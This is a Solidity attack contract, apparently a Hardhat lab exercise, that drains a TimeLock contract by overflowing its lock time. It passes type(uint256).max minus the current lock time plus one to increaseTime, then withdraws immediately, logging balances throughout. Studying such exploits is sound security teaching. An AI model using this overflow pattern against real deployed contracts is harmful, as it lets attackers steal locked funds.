// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "hardhat/console.sol";

interface ITimeLock {
    function deposit() external payable;
    function withdraw() external;
    function getLockTime(address _owner) external view returns (uint256);
    function increaseTime(uint256 _secondsToIncrease) external;
    function getBalance(address _owner) external view returns (uint256);
}

contract TimeAttack {
    ITimeLock public timeLock;

    constructor(address _timeLock) {
        timeLock = ITimeLock(_timeLock);
    }

    receive() external payable {}

    function attack() external payable {
        // Deposit Ether into the TimeLock contract
        timeLock.deposit{value: msg.value}();

        // Log the balance after depositing
        uint256 bal = timeLock.getBalance(address(this));
        console.log("Balance Deposited:", bal);

        // Calculate the overflow value
        console.log("Original lockTime:", timeLock.getLockTime(address(this)));
uint256 maxUint = type(uint256).max - timeLock.getLockTime(address(this)) + 1;
console.log("Calculated maxUint for overflow:", maxUint);
timeLock.increaseTime(maxUint);
console.log("New lockTime after overflow:", timeLock.getLockTime(address(this)));
 console.log("Balance before attack:", address(this).balance);

        // Withdraw the funds
       console.log("TimeLock contract balance before withdraw:", address(timeLock).balance);
timeLock.withdraw();
console.log("TimeLock contract balance after withdraw:", address(timeLock).balance);


        // Log the balance after the attack
        console.log("Balance after attack:", address(this).balance);
    }
}
